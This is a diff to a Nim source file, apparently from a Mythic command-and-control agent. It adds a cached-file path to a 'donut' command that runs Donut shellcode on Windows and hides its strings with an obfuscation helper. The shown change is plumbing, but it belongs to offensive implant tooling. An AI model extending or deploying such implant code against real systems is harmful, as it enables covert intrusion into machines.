@@ -1,6 +1,7 @@
 import ../utils/m_responses
 import ../utils/debug
 import ../utils/strenc
+import ../global_data
 import std/[json, base64, strformat]
 
 when defined(windows):
@@ -18,9 +19,28 @@ type
 
 proc executeDonutShellcode*(taskId: string, shellcode: seq[byte], params: JsonNode): JsonNode
 
+# Forward declaration
+proc processDonutChunk*(taskId: string, params: JsonNode, chunkData: string, 
+                        totalChunks: int, currentChunk: int, 
+                        fileData: var seq[byte]): JsonNode
+
 proc donut*(taskId: string, params: JsonNode): JsonNode =
   when defined(windows):
     try:
+      # Check if using cached file first (no uuid needed)
+      if params.hasKey(obf("cached")):
+        let cachedName = params[obf("cached")].getStr()
+        let cachedData = getCachedFile(cachedName)
+        if cachedData.len == 0:
+          return mythicError(taskId, obf("File not found in cache. Use register_file first: ") & cachedName)
+        # Build params with dummy uuid for downstream parsing
+        var cachedParams = copy(params)
+        if not cachedParams.hasKey(obf("uuid")):
+          cachedParams[obf("uuid")] = %""
+        var fileData = cachedData
+        return processDonutChunk(taskId, cachedParams, "", 1, 1, fileData)
+      
+      # Non-cached: parse full args (uuid required)
       let args = to(params, DonutArgs)
       
       debug &"[DEBUG] Donut execution: {args.assembly_name}"
